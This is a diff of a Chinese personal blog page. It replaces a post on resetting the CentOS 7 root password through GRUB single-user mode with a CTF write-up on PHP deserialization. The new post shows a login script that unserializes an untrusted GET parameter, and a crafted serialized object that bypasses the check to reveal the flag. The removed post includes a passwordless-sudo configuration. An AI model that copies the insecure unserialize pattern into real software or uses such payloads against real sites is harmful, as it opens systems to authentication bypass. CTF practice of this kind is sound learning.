@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>CentOS7重置root密码 | 蹦蹦小圆帽の部落格</title>
+    <title>CTF之PHP反序列化2 | 蹦蹦小圆帽の部落格</title>
     <meta name="author" content="蹦蹦小圆帽" />
     <meta name="description" content="这个世界灿烂盛大！" />
     <meta name="keywords" content="blog" />
@@ -163,14 +163,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>CentOS7重置root密码</h1>
+        <h1>CTF之PHP反序列化2</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/9/28
+            2025/11/19
         </span>
         
         
@@ -182,8 +182,29 @@
             
             <span class="tag">
                 
-                <a href="/tags/Linux/" style="color: #03a9f4">
-                    Linux
+                <a href="/tags/CTF/" style="color: #00a596">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Web/" style="color: #03a9f4">
+                    Web
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #00bcd4">
+                    渗透测试
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/PHP/" style="color: #03a9f4">
+                    PHP
                 </a>
             </span>
             
@@ -192,68 +213,45 @@
     </div>
     
     <div class="content" v-pre>
-        <h1>CentOS 7 重置root密码</h1>
-<p>CentOS 7 安装过程中没有设置root密码、没有将新建的用户加入管理员组，导致无法使用su和sudo命令</p>
-<h2 id="解决思路">解决思路</h2>
-<p>进入single user mode设置root密码或将用户加入sudoers里面</p>
-<h2 id="解决步骤">解决步骤</h2>
-<ol>
-<li>
-<p>重启虚拟机，在GRUB引导页面按 <code>E</code> 键，进入编辑模式</p>
-</li>
-<li>
-<p>找到<code>linux</code>行，例如：</p>
-<pre><code>linux16 /vmlinuz-3.10.0-862.e17...
+        <h1>PHP反序列化2</h1>
+<h2 id="题目">题目</h2>
+<p>序列化迷城 2：数字迷宫</p>
+<p>在激活了第一个神器后，铁柱发现这只是通往更大秘密的入口。教授设计了一个复杂的数字迷宫，只有通过特定的身份验证才能进入迷宫的核心区域。迷宫的守卫是一个登录系统。但铁柱很快意识到，系统存在反序列化漏洞，他可以通过构造特殊的序列化对象来绕过身份验证，进入迷宫的深处寻找下一个线索。</p>
+<h2 id="解题步骤：">解题步骤：</h2>
+<p>打开题目得到页面：</p>
+<pre><code class="language-php"> &lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+include(&quot;flag.php&quot;);
+class mylogin
+&#123;
+    var $user;
+    var $pass;
+    function __construct($user, $pass)
+    &#123;
+        $this-&gt;user = $user;
+        $this-&gt;pass = $pass;
+    &#125;
+    function login()
+    &#123;
+        if ($this-&gt;user == &quot;daydream&quot; and $this-&gt;pass == &quot;ok&quot;) &#123;
+            return 1;
+        &#125;
+    &#125;
+&#125;
+$a = unserialize($_GET['param']);
+if ($a-&gt;login()) &#123;
+    echo $flag;
+&#125;
+?&gt; 
 </code></pre>
-<p>在这一行的末尾（方向键移动到行尾，建议按<code>END</code>键定位到末尾，有些同学可能不知道行尾的意思</p>
-</li>
-<li>
-<p>添加以下内容（不需要另起一行！！）</p>
-<pre><code>rd.break console=tty0
+<p>我们看到要想<code>echo $flag;</code>，首先需要让<code>$a-&gt;login()</code>为true，而这里变量<code>$a</code>可控（<code>$a = unserialize($_GET['param']);</code>），我们可以尝试构造<code>param</code>：</p>
+<pre><code class="language-php">O:&lt;类名长度&gt;:&quot;类名&quot;:&lt;属性数量&gt;:&#123;&lt;属性&gt;&#125;
 </code></pre>
-<p>然后按<code>Ctrl+X</code>启动（进入单用户模式）</p>
-</li>
-<li>
-<p>以rw模式重新挂载/sysroot:</p>
-<pre><code>mount -o rw,remount /sysroot
+<p>根据<code>mylogin</code>，构造：</p>
+<pre><code>?param=O:7:&quot;mylogin&quot;:2:&#123;s:4:&quot;user&quot;;s:8:&quot;daydream&quot;;s:4:&quot;pass&quot;;s:2:&quot;ok&quot;;&#125;
 </code></pre>
-</li>
-<li>
-<p>切换到/sysroot：</p>
-<pre><code>chroot /sysroot
-</code></pre>
-</li>
-<li>
-<p>标准输入修改root密码</p>
-<pre><code>echo '123456' | passwd --stdin root
-</code></pre>
-<p>注意需要selinux处于disabled状态，如果不懂请参考方法2</p>
-</li>
-<li>
-<p>(方法2) 将当前用户添加到sudoers文件：</p>
-<pre><code>EDITOR=vim visudo
-</code></pre>
-<p>找到这一行：（可以通过直接输入<code>/Allow root to run</code>快速搜索）</p>
-<pre><code>root    ALL=(ALL)   ALL
-</code></pre>
-<p>在下面插入（按<code>i</code>进入插入模式）：</p>
-<pre><code>你的用户名  ALL=(ALL)   NOPASSWD:ALL
-</code></pre>
-<p>然后按<code>Esc</code>退出插入模式，按住<code>Ctrl</code>连续按两下<code>Z</code>保存退出</p>
-<p>输入<code>exit</code>退出chroot容器</p>
-<p>输入<code>reboot</code>重启</p>
-</li>
-<li>
-<p>(方法2) 修改root密码</p>
-<p>开机后登陆你的用户，打开终端，输入：</p>
-<pre><code>sudo su
-</code></pre>
-<p>进入root用户，然后输入</p>
-<pre><code>passwd root
-</code></pre>
-<p>输入你要设置的密码（输入两遍）即可重置root密码</p>
-</li>
-</ol>
+<p>得到flag</p>
 
     </div>
     
